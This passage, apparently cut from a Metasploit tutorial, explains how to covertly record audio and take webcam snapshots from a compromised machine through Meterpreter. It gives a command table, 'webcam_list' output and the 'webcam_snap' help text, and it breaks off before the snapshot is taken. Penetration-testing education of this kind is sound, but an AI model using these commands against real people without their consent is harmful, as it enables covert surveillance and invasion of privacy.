  md: '# # Capturing Webcam Video, Screenshots and Sound


    When I was listening to a news report while back I remember it going on on and
    on about a brand new APT (Advanced Persistent Threat) that was so advanced that
    it could actually allow attackers to turn on your webcam and record sound. I thought
    this was completely ridiculous as you have been able to do this with Metasploit
    for years.


    # ## Webcam Commands


    There are several Webcam Commands available:


    | Command | Description |

    | --- | --- |

    | record_mic | Record audio from the default microphone for X seconds |

    | webcam_chat | Start a video chat |

    | webcam_list | List webcams |

    | webcam_snap | Take a snapshot from the specified webcam |

    | webcam_stream | Play a video stream from the specified webcam |


    Type "webcam_list" to display any available webcam on the target:


    ```

    meterpreter > webcam list

    1: USB.0 VGA UVC Webcam

    ```


    On my system I have a UVC webcam located at number 1. We have several webcam options,
    one is "webcam_snap" which takes a screenshot through the target webcam.


    ```

    Type "webcam_snap -h" to see available options

    meterpreter > webcam_snap -h

    Usage: webcam_snap [options]


    Grab a frame from the specified webcam.


    OPTIONS:

    -h Help Banner

    -i <opt> The index of the webcam to use (Default: 1)

    -p <opt> The JPEG image path (Default: ''dwypFkz.jpeg'')

    -q <opt> The JPEG image quality (Default: ''50'')

    -v <opt> Automatically view the JPEG image (Default: ''true'')

    ```


    We can use all the defaults, so just type "webcam_snap":'
  merge: -1
